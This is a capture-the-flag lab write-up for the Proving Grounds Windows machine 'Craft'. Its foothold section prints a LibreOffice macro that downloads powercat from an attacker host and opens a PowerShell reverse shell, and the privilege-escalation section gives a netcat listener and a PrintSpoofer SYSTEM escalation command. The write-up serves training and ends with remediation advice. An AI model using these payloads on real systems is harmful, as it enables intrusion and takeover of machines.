# Craft — Proving Grounds

| | |
|---|---|
| **Platform** | Proving Grounds (Practice) |
| **Difficulty** | Medium |
| **OS** | Windows |
| **Status** | ✅ Practice machine, no overlap with the OSCP exam pool |
| **Key techniques** | LibreOffice macro RCE via document upload, writable XAMPP webroot, `SeImpersonatePrivilege` (PrintSpoofer) |

---

## TL;DR

Craft's resume-upload form only accepts `.odt` files, but a public exploit
for a LibreOffice `.odt` macro vulnerability didn't trigger cleanly on its
own. Building the malicious macro manually inside LibreOffice's macro editor
and attaching it to the document's open-event got the same result more
reliably. From the resulting foothold, a writable XAMPP web root gives a
second, stabler shell as the `apache` service account, which holds
`SeImpersonatePrivilege` — cleared with PrintSpoofer for SYSTEM.

---

## Recon & Enumeration

```bash
sudo nmap -sCV -p- -Pn <TARGET_IP>
```

The standout feature was a resume-upload form that only accepted `.odt`
(OpenDocument Text) files.

---

## Foothold / Initial Access

A known Python exploit exists for planting a macro payload into a
LibreOffice `.odt` file (the same underlying idea as Office macro attacks —
embed a `Sub Main` script that runs when the document opens). The published
Python 2 exploit needed a Python 3 port to run in the current environment;
after installing the missing modules and generating a malicious `.odt`, the
initial upload didn't trigger anything.

Rather than keep fighting the generator script, the same result was built
by hand: inside LibreOffice, **Tools → Macros → Organize Macros**, a new
macro was written to download and execute a PowerShell reverse shell via
`powercat`:

```vbscript
Sub Main
    Shell("cmd.exe /c powershell.exe -ExecutionPolicy Bypass -NoProfile -Command ""IEX(New-Object Net.WebClient).DownloadString('http://<ATTACKER_IP>/powercat.ps1'); powercat -c <ATTACKER_IP> -p 4444 -e powershell""")
End Sub
```

That macro was then assigned to the document's own open event
(**Tools → Customize → Events → Open Document**), so it runs the moment the
file is opened — exactly what a resume-upload workflow does automatically
on the server side. Uploading this document and hosting `powercat.ps1` on a
listener caught a shell as soon as the server processed the upload.

```bash
nc -lvnp 4444
```

User flag retrieved.

---

## Privilege Escalation

`winPEAS` on the target didn't surface much beyond confirming the `apache`
service account, but manual checking of the web root found `C:\xampp\htdocs`
was **writable**. Generating a PHP reverse shell and dropping it directly
into the web root, then triggering it through a browser request, produced a
second shell running *as* `apache` — more stable than the macro-triggered
one, and a useful checkpoint before continuing privesc.

`whoami /priv` on this `apache` shell showed **`SeImpersonatePrivilege`**.
Uploading **PrintSpoofer** and running it spawned a SYSTEM process directly:

```
PrintSpoofer.exe -i -c cmd
```

SYSTEM shell obtained, root flag retrieved.

---

## Lessons Learned

- **A public exploit script not working isn't the end of the road** —
  understanding *what* the exploit actually builds (a macro-embedded
  document, in this case) means it can be reproduced manually through the
  application's own UI when the automation fails.
- **A writable web root reachable from a foothold shell is a second,
  cleaner way in** — worth checking even after an initial shell already
  exists, since it can be more stable or higher-privileged.
- `SeImpersonatePrivilege` on a service account is close to an automatic
  SYSTEM shell via PrintSpoofer/Potato-family tools — check for it
  immediately after any new foothold.

---

## Remediation

- Disable macro execution for documents opened from an automated upload
  pipeline, or process uploads in a sandboxed/macro-stripped environment.
- Ensure the web root and application directories are not writable by the
  service account that serves them.
- Strip `SeImpersonatePrivilege` from service accounts that don't need it,
  or apply the available mitigations against Potato-family COM abuse.

---

**Machine:** [Proving Grounds — Craft](https://portal.offsec.com/labs/play)
